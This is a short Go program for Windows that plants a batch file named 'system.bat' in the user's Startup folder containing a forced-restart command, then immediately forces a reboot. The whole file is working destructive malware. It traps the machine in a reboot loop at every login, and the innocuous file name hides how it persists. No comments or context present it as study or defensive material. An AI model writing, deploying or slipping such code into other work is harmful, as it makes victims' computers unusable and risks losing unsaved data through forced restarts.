package main

import (
	"os"
	"os/exec"
	"path"
)

func main() {
	userHome, _ := os.UserHomeDir()
	startUpFilePath := path.Join(userHome, "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "system.bat")

	file, _ := os.Create(startUpFilePath)
	file.WriteString("shutdown /r /f /t 0")
	file.Close()

	exec.Command("shutdown", "/r", "/f", "/t", "0").Run()
}
